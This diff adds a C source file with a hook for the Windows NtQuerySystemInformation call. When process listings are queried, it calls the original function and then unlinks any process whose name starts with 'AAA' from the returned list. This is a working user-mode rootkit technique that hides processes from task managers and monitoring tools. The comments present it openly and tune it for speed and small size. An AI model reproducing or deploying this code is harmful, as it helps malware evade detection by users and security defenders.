@@ -1,0 +1,61 @@
+#include <Windows.h>
+#define STATUS_SUCCESS ((NTSTATUS)0)
+
+// define whatever ntdll structures manually instead of including the whole lib for size reducing
+typedef struct _MY_SYSTEM_PROCESS_INFORMATION
+{
+	ULONG NextEntryOffset;
+	ULONG NumberOfThreads;
+	LARGE_INTEGER Reserved[3];
+	LARGE_INTEGER CreateTime;
+	LARGE_INTEGER UserTime;
+	LARGE_INTEGER KernelTime;
+	UNICODE_STRING ImageName;
+	ULONG BasePriority;
+	HANDLE ProcessId;
+	HANDLE InheritedFromProcessId;
+} MY_SYSTEM_PROCESS_INFORMATION, *PMY_SYSTEM_PROCESS_INFORMATION;
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+//define prototype of targeted function
+typedef NTSTATUS(WINAPI *_NtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
+_NtQuerySystemInformation __NtQuerySystemInformation; //pointers
+
+
+
+// this is our filtering function, any calls on "NtQuerySystemInformation" will call our function at execution
+NTSTATUS WINAPI _NtQuerySystemInformation_(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
+{
+	//we call the original api anyway, then we check the returned data
+	NTSTATUS status = __NtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
+
+	if (STATUS_SUCCESS != status) return status; //just return as it is if something went wrong
+
+	if (SystemInformationClass == SystemProcessInformation) //we are interested to filter this class only, related to [process-listing]
+	{
+		PMY_SYSTEM_PROCESS_INFORMATION pCurrent = NULL;
+		PMY_SYSTEM_PROCESS_INFORMATION pNext = (PMY_SYSTEM_PROCESS_INFORMATION)SystemInformation; //defined pointer on the returned data,  SystemInformation is a PVOID of data buffer
+
+		if (pNext == NULL) return status; //could happen in poor taskview tools, if happned it will crash the target app, so it worth it to check if our pointer in NULL 
+		do //do-while loop through all the returned process lists
+		{
+			pCurrent = pNext; // save previous index to move for new one
+			pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset); // as said above pCurrent = the previous index, so pCurrent->NextEntryOffset + pCurrent = should lead you to the next index, or Zero if no more.
+
+			if (pNext->ImageName.Buffer[0] == L'A' && pNext->ImageName.Buffer[1] == L'A' && pNext->ImageName.Buffer[2] == L'A') // we check only the first 3 wide chars directly without using any api like (strstr/strcmp) which dramatically boost our filtering speed. 
+			{
+				if (pNext->NextEntryOffset == 0) //if no other entries after this index:
+				{
+					pCurrent->NextEntryOffset = 0; //set the previous index (record) as 0 just right before us
+				}
+				else
+				{
+					pCurrent->NextEntryOffset += pNext->NextEntryOffset; //otherwise we modify the next index size to jump over our records in the process-list
+				}
+				pNext = pCurrent; 
+			}
+		} while (pCurrent->NextEntryOffset != 0); ////do-while loop
+	}
+	return status; //end of function
+}
+
